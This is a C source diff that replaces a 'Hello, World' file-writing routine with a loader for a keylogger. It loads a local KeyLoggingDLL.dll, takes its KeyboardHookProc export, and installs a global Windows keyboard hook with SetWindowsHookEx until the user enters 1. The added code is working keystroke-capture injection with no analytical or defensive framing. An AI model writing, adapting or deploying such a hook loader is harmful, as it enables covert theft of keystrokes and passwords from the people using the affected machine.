@@ -3,32 +3,23 @@
 
 int main()
 {
-    HANDLE hFile;
-    DWORD dwBytesWritten;
-    const char* message = "Hello, World!";
-    const char* fileName = "C:\\Users\\ISE\\Desktop\\output.txt";
+	int pid = GetCurrentProcessId();
+	printf("PID:%d\n", pid);
+	const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
+	HMODULE dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
 
-    hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HOOKPROC hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
+	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);
 
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        printf("Error creating file. Error code: %d\n", GetLastError());
-        return 1;
-    }
 
-    if (!WriteFile(hFile, message, strlen(message), &dwBytesWritten, NULL))
-    {
-        printf("Error writing to file. Error code: %d\n", GetLastError());
-        CloseHandle(hFile);
-        return 1;
-    }
-
-    printf("Data written to file successfully!\n");
-    CloseHandle(hFile);
-    while (1) {
-        Sleep(1); // Sleep for 1 second
-    }
-    return 0;
+	int d = 0;
+	while (d != 1)
+	{
+		scanf("%d", &d);
+	}
+	printf("Out");
+	UnhookWindowsHookEx(hook);
+	return 0;
 }
 
 
